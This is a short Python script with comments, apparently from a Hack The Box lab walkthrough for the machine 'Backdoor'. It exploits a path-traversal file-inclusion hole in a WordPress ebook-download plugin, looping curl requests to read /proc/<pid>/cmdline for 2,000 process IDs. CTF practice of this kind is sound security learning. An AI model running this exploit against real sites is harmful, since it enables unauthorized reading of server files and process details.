# https://app.hackthebox.com/machines/416
# For Backdoor, part of the exploitation requires you to figure out what service is
# running on an odd port. A Wordpress plugin with a LFI vulnerability allows you to view details
# on running processes through /proc so I wrote this script to bruteforce through 2000 PIDs to
# see any command line details for any of the processes. For this specific script to work remember to
# put backdoor.htb in your /ect/hosts file or replace it with the IP address.
# After this ran I used fgrep to search the files for the port number that the service was running
# on and this lead me to finding the file from the PID with the command that started the service
# which gave me the service name and allowed me to search for an exploit for it.

import os

proc = 1

while proc <= 2000:

    os.system("curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/" + str(proc) + "/cmdline > proc_" + str(proc) + ".txt")

    proc += 1
